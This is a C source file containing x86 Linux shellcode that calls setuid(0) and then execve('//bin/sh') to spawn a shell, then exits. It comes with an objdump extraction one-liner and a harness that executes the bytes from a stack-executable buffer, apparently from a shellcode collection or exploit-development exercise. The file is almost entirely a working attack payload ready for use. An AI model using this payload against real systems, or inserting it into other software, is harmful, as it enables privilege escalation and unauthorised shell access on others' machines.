/* setuid(); execve(); exit(); */
/*
 echo `objdump -d execve  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x31\xc0\x89\xc3\x89\xd9\x6a\x17\x66\x58\x87\xc9\xcd\x80\x31\xc0\x50\xc7\x44\x24\xfc\x6e\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x2f\x62\x69\x83\xec\x08\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\x31\xf6\x8d\x04\x30\xcd\x80\x31\xc0\xb0\x01\xcd\x80

*/

/* 
 * Test
 * $ gcc -Wall -z execstack  execve.c 
 * $ ./a.out 
 * Size: 63 bytes (original size was 45 ==> 140 %)
 * $    
 */

#include <stdio.h>

char shellcode[]=
"\x31\xc0\x89\xc3\x89\xd9\x6a\x17\x66\x58\x87\xc9\xcd\x80\x31\xc0\x50\xc7\x44"
"\x24\xfc\x6e\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x2f\x62\x69\x83\xec\x08\x89\xe3"
"\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\x31\xf6\x8d\x04\x30\xcd\x80\x31"
"\xc0\xb0\x01\xcd\x80";

typedef int (*func_ptr)();
int main()
{
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ((func_ptr) shellcode)();
        return 0;
}
